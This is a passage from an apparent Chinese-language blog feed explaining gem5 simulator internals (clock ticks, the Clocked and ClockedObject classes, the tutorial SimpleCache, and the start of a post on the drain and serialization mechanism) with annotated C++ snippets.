class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint64_t</span> Tick;<br>__thread Tick *_curTickPtr;<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> Tick <span class="hljs-title">curTick</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> *Gem5Internal::_curTickPtr; &#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>__thread</code> 将变量存储到线程的局部空间中，在线程的生命周期内有效。因此，在多线程程序中，每个线程都创建了该变量的唯一实例，并在线程终止时销毁。<code>__thread</code> 存储类说明符能被 gcc 识别，可确保线程安全：因为变量被多个线程访问时无需担心竞争，同时避免处理线程同步带来的繁琐编程。</p></blockquote><h3 id="Clocked-类">Clocked 类</h3><p>Clocked 类为 SimObject 类提供时钟周期模拟。Gem5 在模拟 SimObject 对象的工作流程时，会模拟硬件中时钟打拍行为，进而得到准确的模拟性能。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Clocked</span> &#123;<br>  <span class="hljs-comment">/** Tick value of the next clock edge (&gt;= curTick()) at the</span><br><span class="hljs-comment">   *  time of the last call to update() */</span><br>  <span class="hljs-keyword">mutable</span> Tick tick;<br>  <span class="hljs-comment">/* Cycle counter value corresponding to the current value of &#x27;tick&#x27; */</span><br>  <span class="hljs-keyword">mutable</span> Cycles cycle;<br>  <span class="hljs-comment">/* The clock domain this clocked object belongs to */</span><br>  ClockDomain &amp;clockDomain;<br>&#125;<br></code></pre></td></tr></table></figure><p>Clocked 类中有三个变量：</p><ul><li>tick 变量类型为 <code>uint64_t</code>，指示下一个时钟边缘沿到来的 tick 值。tick 值是模拟器中时间的最小单位</li><li>cycle 类型为 Cycles，该类表示当前经过的时钟周期总数，其内部包装了 <code>uint64_t</code>。这是硬件中常说的时钟周期。之所以不直接使用 <code>uint64_t</code>，是为避免混淆 Tick 和 Cycles 这两个类型。</li><li>clockDomain 表示位于的时钟域。时钟域是若干个共享同一个时钟的 SimObject 对象集合。其中，<code>clockPeriod()</code> 记录了时钟的周期（单位：Tick）。</li></ul><p>Clocked 类中最重要的函数就是 <code>updateClockPeriod()</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Update the tick to the current tick</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">updateClockPeriod</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-comment">// tick and cycle update</span><br>  <span class="hljs-built_in">update</span>();<br>  <span class="hljs-comment">// hook function to add extra work.</span><br>  <span class="hljs-built_in">clockPeriodUpdated</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，<code>clockPeriodUpdated()</code> 函数是 hook 函数，由子类负责实现，用来增加一些与时钟周期打拍有关的功能。而 <code>update()</code> 函数的实现如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (tick &gt;= <span class="hljs-built_in">curTick</span>())<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-comment">/** in most case, add one cycle */</span><br>  tick += <span class="hljs-built_in">clockPeriod</span>();<br>  ++cycle;<br>  <span class="hljs-keyword">if</span> (tick &gt;= <span class="hljs-built_in">curTick</span>()<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-comment">/* special case, add one more cycle. divCeil(a, b): (a + b -1) / b */</span><br>  Cycles <span class="hljs-built_in">elapsedCycles</span>(<span class="hljs-built_in">divCeil</span>(<span class="hljs-built_in">curTick</span>() - tick, <span class="hljs-built_in">clockPeriod</span>()));<br>  cycle += elapsedCycles;<br>  tick += elapsedCycles * <span class="hljs-built_in">clockPeriod</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><code>update()</code> 对齐了 cycle 和 tick 到下一个时钟沿，若 tick &gt;= curTick()，即当前 tick 已经与全局时钟对齐时，那么时钟就是最新的。大部分情况下，累加一个时钟周期就可以达到最新，但也有例外，需要增加更多的时钟周期才行。</p><p><code>clockEdge()</code> 函数根据传入的 cycles 数，换算出未来达到这一时钟周期数要求的 tick 数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Tick <span class="hljs-title">clockEdge</span><span class="hljs-params">(Cycles cycles = Cycles(<span class="hljs-number">0</span>))</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-comment">// align tick to the next clock edge</span><br>  <span class="hljs-built_in">update</span>();<br>  <span class="hljs-comment">// figure out when this future cycle is</span><br>  <span class="hljs-keyword">return</span> tick + <span class="hljs-built_in">clockPeriod</span>() * cycles;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ClockedObject">ClockedObject</h3><p>ClockedObject 类继承了 Clocked 类和 SimObject 类，以 Tick 与对象的 cycle 相关联。其中 PowerState 类也是 SimObject 类的派生类，它提供了描述功耗状态和切换功耗状态的功能。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ClockedObject</span> : <span class="hljs-keyword">public</span> SimObject, <span class="hljs-keyword">public</span> Clocked &#123;<br>  <span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">ClockedObject</span>(<span class="hljs-type">const</span> ClockedObjectParams &amp;p);<br><br>  <span class="hljs-comment">/** Parameters of ClockedObject */</span><br>  <span class="hljs-keyword">using</span> Params = ClockedObjectParams;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(CheckpointOut &amp;cp)</span> <span class="hljs-type">const</span> <span class="hljs-keyword">override</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unserialize</span><span class="hljs-params">(CheckpointIn &amp;cp)</span> <span class="hljs-keyword">override</span></span>;<br>  PowerState *powerState;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 gem5 的教程代码 part2 中，使用 ClockedObject 类实现了一个简单的 Cache：SimpleCache 类。借助这一例子，我们可以从中看出 SimObject 类以及其派生类在模拟系统时的作用。</p><h3 id="SimpleCache">SimpleCache</h3><p>现在，根据我之前对 gem5 底层的了解，我试图理解 SimpleCache 类中的实现原理。SimpleCache 类描述的 Cache 在硬件上是一种</p><ul><li>全相联的 Cache</li><li>使用随机替换算法来实现新旧 Cacheline 替换</li><li>只能同时处理一个请求</li><li>写回式的 Cache</li></ul><p>要实现这样一个 SimpleCache，首先需要1）连接 Cache 的端口。2）Cache 的块大小以及容量，存储数据等。3）Cache 的命中、丢失延迟等。这些需求都在下面的类定义中有所体现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleCache</span> : <span class="hljs-keyword">public</span> ClockedObject &#123;<br>  <span class="hljs-comment">// Latency to check the cache. Number of cycles for both hit and miss</span><br>  <span class="hljs-type">const</span> Cycles latency;<br><br>  <span class="hljs-comment">// The block size for the cache</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> blockSize;<br><br>  <span class="hljs-comment">// Number of blocks in the cache (size of cache / block size)</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> capacity;<br><br>  <span class="hljs-comment">// Instantiation of the CPU-side port</span><br>  std::vector&lt;CPUSidePort&gt; cpuPorts;<br><br>  <span class="hljs-comment">// Instantiation of the memory-side port</span><br>  MemSidePort memPort;<br><br>  <span class="hljs-comment">// True if this cache is currently blocked waiting for a response.</span><br>  <span class="hljs-type">bool</span> blocked;<br><br>  <span class="hljs-comment">// Packet that we are currently handling. Used for upgrading to larger</span><br>  <span class="hljs-comment">// cache line sizes</span><br>  PacketPtr originalPacket;<br><br>  <span class="hljs-comment">// The port to send the response when we recieve it back</span><br>  <span class="hljs-type">int</span> waitingPortId;<br><br>  <span class="hljs-comment">// For tracking the miss latency</span><br>  Tick missTime;<br><br>  <span class="hljs-comment">// An incredibly simple cache storage. Maps block addresses to data</span><br>  std::unordered_map&lt;Addr, <span class="hljs-type">uint8_t</span>*&gt; cacheStore;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于函数实现，直接看我们能理解的部分。例如，<code>handleRequest()</code> 函数用于处理来自 CPU 的 Cache 访问/读写请求。下面代码展示了请求被处理的过程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SimpleCache::handleRequest</span><span class="hljs-params">(PacketPtr pkt, <span class="hljs-type">int</span> port_id)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (blocked) &#123;<br>    <span class="hljs-comment">// There is currently an outstanding request so we can&#x27;t respond. Stall</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-built_in">DPRINTF</span>(SimpleCache, <span class="hljs-string">&quot;Got request for addr %#x\n&quot;</span>, pkt-&gt;<span class="hljs-built_in">getAddr</span>());<br><br>  <span class="hljs-comment">// This cache is now blocked waiting for the response to this packet.</span><br>  blocked = <span class="hljs-literal">true</span>;<br><br>  <span class="hljs-comment">// Store the port for when we get the response</span><br>  <span class="hljs-built_in">assert</span>(waitingPortId == <span class="hljs-number">-1</span>);<br>  waitingPortId = port_id;<br><br>  <span class="hljs-comment">// Schedule an event after cache access latency to actually access</span><br>  <span class="hljs-built_in">schedule</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">EventFunctionWrapper</span>([<span class="hljs-keyword">this</span>, pkt]&#123;<span class="hljs-built_in">accessTiming</span>(pkt);&#125;,<br>    <span class="hljs-built_in">name</span>() + <span class="hljs-string">&quot;.accessEvent&quot;</span>, <span class="hljs-literal">true</span>), <span class="hljs-built_in">clockEdge</span>(latency));<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于 Cache 一次只能处理一个请求，因此当 Cache 状态为 blocked 时，请求无法被处理，直接返回 false。否则，将状态设置为 blocked，然后创建一个 Event 事件并调度：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">schedule</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">EventFunctionWrapper</span>([<span class="hljs-keyword">this</span>, pkt]&#123;<span class="hljs-built_in">accessTiming</span>(pkt);&#125;,<br>  <span class="hljs-built_in">name</span>() + <span class="hljs-string">&quot;.accessEvent&quot;</span>, <span class="hljs-literal">true</span>), <span class="hljs-built_in">clockEdge</span>(latency));<br></code></pre></td></tr></table></figure><p>回顾一下之前博客中的分析，<code>schedule()</code> 函数负责事件调度，其参数是将要被执行的事件 event 和具体执行时间 when。在这里，被执行的事件 event 就是 <code>accessTiming(pkt)</code> 函数，它被 EventFunctionWrapper 进一步封装，出入到 <code>schedule()</code> 中，而具体执行的时间，是 <code>clockEdge(latency)</code>。其中 latency 是 Cache 对于检查数据是否命中的延迟，而 <code>clockEdge()</code> 将 latency 的时间单位从 cycles 转换为 ticks 的函数。当时间和事件本身都被设置好后，如同前面提到的那样，事件会按照调度的时间先后顺序，被放入事件队列中等待执行。最后产生的效果就是，等待了 latency 个时钟周期后，这一请求被 Cache 执行并完成。</p><p><code>accessTiming(pkt)</code> 函数功能是访问 Cache，判断读取的请求是否命中，并统计出所需要的延迟。如果命中，那么直接进入返回应答的操作，发送应答消息给 CPU 端：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SimpleCache::accessTiming</span><span class="hljs-params">(PacketPtr pkt)</span> </span>&#123;<br>  <span class="hljs-type">bool</span> hit = <span class="hljs-built_in">accessFunctional</span>(pkt);<br>  <span class="hljs-built_in">DPRINTF</span>(SimpleCache, <span class="hljs-string">&quot;%s for packet: %s\n&quot;</span>, hit ? <span class="hljs-string">&quot;Hit&quot;</span> : <span class="hljs-string">&quot;Miss&quot;</span>,<br>      pkt-&gt;<span class="hljs-built_in">print</span>());<br><br>  <span class="hljs-keyword">if</span> (hit) &#123;<br>    <span class="hljs-comment">// Respond to the CPU side</span><br>    stats.hits++; <span class="hljs-comment">// update stats</span><br>    <span class="hljs-built_in">DDUMP</span>(SimpleCache, pkt-&gt;<span class="hljs-built_in">getConstPtr</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(), pkt-&gt;<span class="hljs-built_in">getSize</span>());<br>    pkt-&gt;<span class="hljs-built_in">makeResponse</span>();<br>    <span class="hljs-built_in">sendResponse</span>(pkt);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">/* ... */</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而若没有命中，那么需要先记录开始替换的时刻，然后进行目标块的替换。这里需要注意到，因为请求的地址不一定与块地址大小对齐，而内存端口取 Cache 块大小时要求必须是块的首地址。因此，需要分情况讨论是否可以直接访问内存取块（即forward），若未对齐，那么需要重新生成一个块对齐的 Packet 来访问 DRAM 端。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">else</span> &#123;<br>  stats.misses++; <span class="hljs-comment">// update stats</span><br>  missTime = <span class="hljs-built_in">curTick</span>();<br>  <span class="hljs-comment">// Forward to the memory side.</span><br>  <span class="hljs-comment">// We can&#x27;t directly forward the packet unless it is exactly the size</span><br>  <span class="hljs-comment">// of the cache line, and aligned. Check for that here.</span><br>  Addr addr = pkt-&gt;<span class="hljs-built_in">getAddr</span>();<br>  Addr block_addr = pkt-&gt;<span class="hljs-built_in">getBlockAddr</span>(blockSize);<br>  <span class="hljs-type">unsigned</span> size = pkt-&gt;<span class="hljs-built_in">getSize</span>();<br>  <span class="hljs-keyword">if</span> (addr == block_addr &amp;&amp; size == blockSize) &#123;<br>    <span class="hljs-comment">// Aligned and block size. We can just forward.</span><br>    <span class="hljs-built_in">DPRINTF</span>(SimpleCache, <span class="hljs-string">&quot;forwarding packet\n&quot;</span>);<br>    memPort.<span class="hljs-built_in">sendPacket</span>(pkt);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">DPRINTF</span>(SimpleCache, <span class="hljs-string">&quot;Upgrading packet to block size\n&quot;</span>);<br>    <span class="hljs-built_in">panic_if</span>(addr - block_addr + size &gt; blockSize,<br>              <span class="hljs-string">&quot;Cannot handle accesses that span multiple cache lines&quot;</span>);<br>    <span class="hljs-comment">// Unaligned access to one cache block</span><br>    <span class="hljs-built_in">assert</span>(pkt-&gt;<span class="hljs-built_in">needsResponse</span>());<br>    MemCmd cmd;<br>    <span class="hljs-keyword">if</span> (pkt-&gt;<span class="hljs-built_in">isWrite</span>() || pkt-&gt;<span class="hljs-built_in">isRead</span>()) &#123;<br>        <span class="hljs-comment">// Read the data from memory to write into the block.</span><br>        <span class="hljs-comment">// We&#x27;ll write the data in the cache (i.e., a writeback cache)</span><br>        cmd = MemCmd::ReadReq;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;Unknown packet type in upgrade size&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// Create a new packet that is blockSize</span><br>    PacketPtr new_pkt = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Packet</span>(pkt-&gt;req, cmd, blockSize);<br>    new_pkt-&gt;<span class="hljs-built_in">allocate</span>();<br><br>    <span class="hljs-comment">// Should now be block aligned</span><br>    <span class="hljs-built_in">assert</span>(new_pkt-&gt;<span class="hljs-built_in">getAddr</span>() == new_pkt-&gt;<span class="hljs-built_in">getBlockAddr</span>(blockSize));<br><br>    <span class="hljs-comment">// Save the old packet</span><br>    originalPacket = pkt;<br><br>    <span class="hljs-built_in">DPRINTF</span>(SimpleCache, <span class="hljs-string">&quot;forwarding packet\n&quot;</span>);<br>    memPort.<span class="hljs-built_in">sendPacket</span>(new_pkt);<br>&#125;<br></code></pre></td></tr></table></figure><p>SimpleCache 类其余部分的实现也非常有意思，但与该博文的主题偏离太远，我们之后再来细细品读。</p>]]></content>
    
    
    <categories>
      
      <category>Cpp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cpp</tag>
      
      <tag>gem5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解 Gem5 之二</title>
    <link href="/2022/03/08/2022-3-8-gem5-2/"/>
    <url>/2022/03/08/2022-3-8-gem5-2/</url>
    
    <content type="html"><![CDATA[<h1>深入理解 Gem5 之二</h1><p>紧接着对 <a href="https://dingfen.github.io/cpp/2022/02/24/gem5-1.html">gem5 事件机制</a>的研究，本篇博文我重点研究了 gem5 中对象序列化的操作。总的来说，gem5 在对模拟器中的对象序列化前，需要先将其排水（Drain，由于中文翻译的限制，下文统称为 Drain），将不确定的状态先清除，等到一切安排妥当后，再将对象序列化到磁盘中。</p><h2 id="Drain">Drain</h2><h3 id="DrainState">DrainState</h3><p>之前的博文详细解释了事件在 gem5 的作用以及其实现机制。本文开始介绍 gem5 中其他比较重要的机制。</p><p>当 gem5 正常运行时，模拟器中的对象在一开始时都处于 <code>DrainState::Running</code> 状态，并用事件驱动模拟器的运行，这会导致很多对象在运行时处于似是而非的状态——部分信号正在传递，部分程序正在运行，缓冲区还待处理等。然而，模拟器总要在某些时刻有所停顿——准备快照（snapshot）、准备移交 CPU 等。这时候就需要引入 drain 的概念，将这些中间态清除。<strong>drain 指系统清空 SimObject 对象中内部状态的过程</strong>。通常，drain 会在序列化、创建检查点、切换 CPU 模型或 timing 模型前使用。对象会调用 <code>drain()</code> 函数将对象转移到 draining 或 drained 状态。然后进入 drained 状态。下面的代码介绍了四种 drain 状态。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">enum class</span> <span class="hljs-title class_">DrainState</span> &#123;<br>    Running,  <span class="hljs-comment">/**&lt; Running normally */</span><br>    Draining, <span class="hljs-comment">/**&lt; Draining buffers pending serialization/handover */</span><br>    Drained,  <span class="hljs-comment">/**&lt; Buffers drained, ready for serialization/handover */</span><br>    Resuming, <span class="hljs-comment">/**&lt; Transient state while the simulator is resuming */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>当某一个对象进入 drained 状态（<code>drain::drain()</code> 返回 <code>DrainState::drained</code> 时表示该对象已经 drain 干净了）后，模拟仍会继续，直到所有对象都进入 drained 状态。如果该对象需要更多的时间来处理，那么它返回 <code>DrainState::draining</code> 状态。注意：一个对象的 drain 状态可能会被其他状态干扰，因此模拟器需要不停地重复 drain 来保证所有对象已经进入 <code>DrainState::drained</code> 状态。当系统不再需要所有对象维持在 drained 状态时，会调用 <code>resume()</code> 函数，它将让所有对象调用 <code>drainResume()</code> 返回到正常 <code>DrainState::Running</code> 的状态。注意，在恢复过程中可能会创建新的 Drainable 对象。在这种情况下，新对象将在 Resuming 状态下创建，然后再恢复到正常。</p><h3 id="drain-的工作流程">drain 的工作流程</h3><p>根据 gem5 的文档以及源文件中的注释，总结一下 drain 工作的主要流程：</p><ol><li>调用 <code>DrainManager::tryDrain()</code> 函数，该函数会让每个对象调用 <code>Drainable::drain()</code> 函数。如果它们全部返回 true，则 drain 已经完成。否则，DrainManager 将跟踪仍在 draining 的对象。</li><li>模拟器会继续仿真。当一个对象完成 drain 时，它会调用 <code>DrainManager::signalDrainDone()</code> 函数，向 DrainManager 报告 drain 已完成。</li><li>检查是否有对象仍然需要 drain（<code>DrainManager::tryDrain()</code>），如果是，重复上面的过程。</li><li>一旦模拟器中的所有对象的内部状态被清空，这些对象就被序列化到磁盘上，或者发生配置更改：切换CPU模型或更改 timing 模型，总之做一些只能在 drained 后做的事情。</li><li>完成后，调用 <code>DrainManager::resume()</code> 函数，该函数会让所有对象调用 <code>Drainable::drainResume()</code>，返回到正常运行的状态。</li></ol><p>接下来，我们随着代码逐步分析上面的工作流程：</p><h3 id="DrainManager">DrainManager</h3><p>DrainManager 类负责管理全局对象的 drain 工作，显然它必须是个单例。它内部维护了一个包含全局的可 Drainable 的对象数组 _allDrainable，以方便管理所有对象的 drain 工作，并用一个状态变量 _state 指示模拟器的状态。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DrainManager</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/** singleton DrainManager instance */</span><br>    <span class="hljs-function"><span class="hljs-type">static</span> DrainManager &amp;<span class="hljs-title">instance</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> _instance; &#125;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">/** Global simulator drain state */</span><br>    DrainState _state;<br>    <span class="hljs-comment">/** Lock protecting the set of drainable objects */</span><br>    <span class="hljs-keyword">mutable</span> std::mutex globalLock;<br>    <span class="hljs-comment">/** Set of all drainable objects */</span><br>    std::vector&lt;Drainable *&gt; _allDrainable;<br>&#125;;<br></code></pre></td></tr></table></figure><p>从代码上看，第一步中的 <code>tryDrain()</code> 函数实现其实很简单，就是通过 for 循环让每个对象调用 <code>Drainable::drain()</code> 函数，记录并输出 drain 失败的对象（若存在的话），统计其个数，必要时需请求下一轮 drain。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// in DrainManager:  </span><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">tryDrain</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-comment">// 1. change simulator state to Draining</span><br>      _state = DrainState::Draining;<br>      <span class="hljs-comment">// 2. let all Drainable objects to drain, call dmDrain()</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> *obj : _allDrainable) &#123;<br>        DrainState status = obj-&gt;<span class="hljs-built_in">dmDrain</span>();<br>        <span class="hljs-keyword">if</span> (debug::Drain &amp;&amp; status != DrainState::Drained) &#123;<br>            Named *temp = <span class="hljs-built_in">dynamic_cast</span>&lt;Named*&gt;(obj);<br>            <span class="hljs-keyword">if</span> (temp)<br>                <span class="hljs-built_in">DPRINTF</span>(Drain, <span class="hljs-string">&quot;Failed to drain %s\n&quot;</span>, temp-&gt;<span class="hljs-built_in">name</span>());<br>        &#125;<br>        _count += status == DrainState::Drained ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (_count == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// Drain done.</span><br>        _state = DrainState::Drained;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">DPRINTF</span>(Drain, <span class="hljs-string">&quot;Need another drain cycle. %u/%u objects not ready.\n&quot;</span>,<br>                _count, <span class="hljs-built_in">drainableCount</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>题外话，Named 类为 SimObject 对象提供了名字，所有 SimObject 对象都继承了该类。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/** Interface for things with names. */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Named</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">const</span> std::string _name;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Named</span>(<span class="hljs-type">const</span> std::string &amp;name_) : _name(name_) &#123; &#125;<br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Named</span>() = <span class="hljs-keyword">default</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> std::string <span class="hljs-title">name</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _name; &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>此外，在创建一个可 Drainable 的类对象时，DrainManager 类通过注册机制来管理这些对象：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DrainManager::registerDrainable</span><span class="hljs-params">(Drainable *obj)</span> 